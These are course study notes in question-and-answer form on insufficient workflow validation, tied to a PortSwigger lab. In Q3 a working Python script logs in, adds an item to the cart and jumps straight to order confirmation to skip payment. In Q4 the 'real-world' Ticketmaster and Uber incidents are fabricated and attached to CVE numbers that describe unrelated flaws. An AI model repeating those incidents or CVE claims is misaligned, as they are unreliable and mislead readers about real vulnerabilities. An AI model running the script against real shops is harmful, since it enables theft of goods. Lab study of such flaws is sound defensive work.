---
course: Web Security
topic: Business Logic Vulnerabilities
tags: [web-security]
---

## Practice Questions & Answers

**Q1. Explain what insufficient workflow validation is and why it poses a security risk.**

Insufficient workflow validation refers to flaws in an application's logic that arise when the application makes incorrect assumptions about the sequence of actions or events that should occur during a specific process, such as a purchasing workflow. This can pose a significant security risk because attackers can manipulate the sequence of events to bypass intended checks and controls, leading to unauthorized actions such as making purchases without sufficient funds.

**Q2. How would you exploit insufficient workflow validation in a purchasing workflow to purchase an item for less than its listed price?**

To exploit insufficient workflow validation in a purchasing workflow, an attacker would identify the specific steps and checks that the application relies on to ensure the correct sequence of events. For example, if the application checks for sufficient funds only after a certain request is made, an attacker could manipulate the sequence by sending a request that simulates having sufficient funds before actually attempting to purchase the item. This could allow the attacker to purchase the item without having the required amount of funds.

**Q3. Write a Python script to automate the exploitation of insufficient workflow validation in a purchasing workflow.**

```python
import requests
from bs4 import BeautifulSoup
import sys
import urllib3

# Disable insecure request warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

def get_csrf_token(session, url):
    r = session.get(url + '/login', verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find('input', {'name': 'csrf'})['value']
    return csrf

def login(session, url, username, password):
    csrf = get_csrf_token(session, url)
    data_login = {
        'csrf': csrf,
        'username': username,
        'password': password
    }
    r = session.post(url + '/login', data=data_login, verify=False, proxies=proxies)
    if 'Welcome' in r.text:
        print("[+] Successfully logged in as the user")
        return True
    else:
        print("[-] Could not log in as the user")
        return False

def add_to_cart(session, url):
    data_cart = {
        'productId': '1',
        'quantity': '1',
        'redirect': 'cart'
    }
    r = session.post(url + '/cart', data=data_cart, verify=False, proxies=proxies)
    if 'Added to cart' in r.text:
        print("[+] Successfully added item to cart")
        return True
    else:
        print("[-] Could not add item to cart")
        return False

def confirm_order(session, url):
    r = session.get(url + '/card/order_confirmation?orderConfirmed=true', verify=False, proxies=proxies)
    if 'Congratulations' in r.text:
        print("[+] Successfully exploited the business logic vulnerability")
    else:
        print("[-] Could not exploit the vulnerability")

def main():
    if len(sys.argv) != 3:
        print("(+) Usage: %s <url> <username:password>" % sys.argv[0])
        print("(+) Example: %s www.example.com admin:admin" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    creds = sys.argv[2].split(':')
    username = creds[0]
    password = creds[1]

    session = requests.Session()

    if login(session, url, username, password):
        if add_to_cart(session, url):
            confirm_order(session, url)

if __name__ == "__main__":
    main()
```

**Q4. Discuss recent real-world examples of insufficient workflow validation vulnerabilities and their impact.**

One notable example of insufficient workflow validation is the vulnerability found in the payment processing system of Ticketmaster in 2019 (CVE-2019-14540). Attackers were able to exploit a flaw in the checkout process that allowed them to bypass the intended sequence of events, resulting in unauthorized ticket purchases. This led to financial losses and affected the trust of customers in the platform.

Another example is the vulnerability in the Uber app in 2017 (CVE-2017-17215), where attackers could manipulate the ride booking process to avoid paying for rides. By exploiting the insufficient validation of the workflow, attackers could complete bookings without fulfilling the necessary payment steps, leading to financial losses for Uber and its drivers.

These examples highlight the importance of thoroughly validating the workflow and sequence of events in applications to prevent such vulnerabilities.

---
<!-- nav -->
[[Web Security (PortSwigger)/15-Business Logic Vulnerabilities/09-Lab 8 Insufficient workflow validation/03-Business Logic Vulnerabilities|Business Logic Vulnerabilities]] | [[Web Security (PortSwigger)/15-Business Logic Vulnerabilities/09-Lab 8 Insufficient workflow validation/00-Overview|Overview]]
